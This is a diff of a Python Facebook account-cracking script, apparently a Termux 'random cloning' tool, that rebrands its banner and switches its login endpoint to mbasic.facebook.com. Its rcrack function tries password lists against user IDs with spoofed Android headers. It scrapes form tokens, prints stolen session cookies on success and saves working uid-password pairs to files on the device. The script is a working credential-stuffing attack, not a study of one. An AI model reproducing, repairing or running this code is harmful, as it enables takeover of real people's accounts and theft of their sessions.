@@ -1,5 +1,5 @@
 # Facebook: Id Buy Sellar  
-# Github: NEHAL ABBU 
+# Github: NRCYBER 
 import os,sys,time,json,random,re,string,platform,base64,uuid
 os.system("git pull")
 from bs4 import BeautifulSoup as sop
@@ -59,30 +59,24 @@ ta = current.year
 bu = current.month
 ha = current.day
 today = date.today()
-os.system('xdg-open https://t.me/NEHAL ABBU 99/')
-logo =(""" \033[1;31m ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ Nᴇʜᴀʟ ᴛᴇʀᴍᴜx ᴡᴏʀʟᴅ 🤙✅
+os.system('xdg-open https://t.me/NIROB_CYBER99/')
+logo =(""" \033[1;31m𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐌𝐘 𝐖𝐎𝐑𝐋𝐃 ♚
   \033[1;32m  
 
- 
-  ____  _____  ________  ____  ____       _       _____      
-|_   \|_   _||_   __  ||_   ||   _|     / \     |_   _|     
-  |   \ | |    | |_ \_|  | |__| |      / _ \      | |       
-  | |\ \| |    |  _| _   |  __  |     / ___ \     | |   _   
- _| |_\   |_  _| |__/ | _| |  | |_  _/ /   \ \_  _| |__/ |  
-|_____|\____||________||____||____||____| |____||________|  
-                                                                
-                                                        
-                                                                                                                                                                                                                      \033[1;32m                        
-\033[1;39m  ┏━━━━━━━━━━━━━━━━━━━\033[38;5;46mARR\033[1;39m━━━━━━━━━━━━━━━━━━━×━━┓
-\033[1;39m  ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙉𝘼𝙈𝙀\033[1;34m        : [★] NEHAL_ADRIAN  \033[1;39m              ┃
-\033[1;39m  ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[1;34m    : [★] Adrian Ahamed Adib\033[1;39m  ┃
-\033[1;39m  ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙂𝙄𝙏𝙃𝙐𝘽\033[1;34m      : [★] NEHALABBU99\033[1;39m                ┃
-                        ┃
-\033[1;39m  ┃                                                   ┃𝑵𝑬𝑯𝑨𝑳 𝑵𝑶𝑻 𝑨 𝑵𝑨𝑴𝑬 𝑻𝑯𝑰𝑺 𝑰𝑺 𝑩𝑹𝑨𝑵𝑫┃
-                        ┃
-\033[1;39m  ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96mTELEGAM\033[1;34m    : [★] https://t.me/NEHALABBU99\033[1;39m    ┃
-\033[1;39m  ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙉𝘼𝙈𝙀\033[1;34m  : [★] 𝗥𝟰𝗡𝗗𝗢𝗡-𝗖𝗟𝗢𝗡𝗜𝗡𝗚\033[1;39m             ┃
-\033[1;39m  ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙎𝙏𝘼𝙏𝙐𝙎\033[1;34m: [★] PRO 🥵\033[1;39m              ┃
+ ██████╗██╗   ██╗██████╗ ███████╗██████╗ 
+██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗
+██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝
+██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗
+╚██████╗   ██║   ██████╔╝███████╗██║  ██║
+ ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝   \033[1;32m                        
+\033[1;39m  ┏━━━━━━━━━━━━━━━━━━━\033[38;5;46mARR\033[1;39m━━━━━━━━━━━━━━━━━━━━━┓
+\033[1;39m  ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙉𝘼𝙈𝙀\033[1;34m        : [★] NR-CYBER   \033[1;39m       ┃
+\033[1;39m  ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[1;34m    : [★] NR-CYBER\033[1;39m          ┃
+\033[1;39m  ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙂𝙄𝙏𝙃𝙐𝘽\033[1;34m      : [★] NRCYBER\033[1;39m      ┃
+\033[1;39m  ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙍𝙄𝙇𝙄𝙂𝙀𝙎𝙃𝙊𝙉\033[1;34m  : [★] 𝗕𝗔𝗡𝗚𝗟𝗔𝗗𝗘𝗦𝗛𝗜\033[1;39m       ┃
+\033[1;39m  ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96mTELEGAM\033[1;34m    : [★] https://t.me/NIROB_CYBER99\033[1;39m    ┃
+\033[1;39m  ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙉𝘼𝙈𝙀\033[1;34m  : [★] 𝗥𝟰𝗡𝗗𝗢𝗡-𝗖𝗟𝗢𝗡𝗜𝗡𝗚\033[1;39m    ┃
+\033[1;39m  ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙎𝙏𝘼𝙏𝙐𝙎\033[1;34m: [★] free\033[1;39m              ┃
  \033[1;39m ┗━━━━━━━━━━━━━━━━━━━\033[1;31mTEAM\033[1;39m━━━━━━━━━━━━━━━━━━━━┛""") 
 loop = 0
 oks = []
@@ -195,7 +189,7 @@ def rcrack(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            free_fb = session.get('https://d.facebook.com').text
+            free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -206,49 +200,51 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb =     {'authority': 'm.alpha.facebook.com',
+            header_freefb =     {'authority': 'mbasic.facebook.com',
             'method': 'POST',
             'path': 'https://m.alpha.facebook.com/?_rdc=1&_rdr',
             'scheme': 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-    'cache-control': 'max-age=0',
-    # 'cookie': 'datr=yTkUZnAbHTU1JUqGAJC1ATGa; sb=yTkUZi2LW1sA3txMpiLE8aQz; m_pixel_ratio=2.075000047683716; ps_n=0; ps_l=0; wd=521x990; fr=0AePi4H9X1FG1MikI..BmFDnJ..AAA.0.0.BmFDtg.AWWcfs1HAfc',
-    'dpr': '2.075000047683716',
-    'sec-ch-prefers-color-scheme': 'dark',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"CPH1823"',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"10.0.0"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-            'user-agent': pro,}
-            lo = session.post('https://d.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+            'cache-control': 'max-age=0',
+            'dpr': '2.075000047683716',
+            'referer': 'https://mbasic.facebook.com/',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"CPH1823"',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"10.0.0"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+            'viewport-width': '980',
+}
+	            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\r\r\033[1;32m[NEHAL-OK💚] \033[1;32m'+uid+'\033[1;32m • \033[1;32m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+                print('\r\r\033[1;32m[NR-CYBER-OK💚] \033[1;32m'+uid+'\033[1;32m • \033[1;32m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                 cek_apk(session,coki)
-                open('/sdcard/NEHAL-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/NR-CYBER-OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                #print('\r\r\33[1;30m[NEHAL-CP] ' +uid+ ' • ' +ps+           '  \33[0;97m')
-                open('/sdcard/NEHAL-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                #print('\r\r\33[1;30m[NR-CYBER-CP] ' +uid+ ' • ' +ps+           '  \33[0;97m')
+                open('/sdcard/NR-CYBER-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\r%s{x}[{xr} NEHAL {x}][%s\%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
+        sys.stdout.write(f'\r\r%s{x}[{xr}NR-CYBER{x}][%s\%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
         sys.stdout.flush()
     except:
         pass
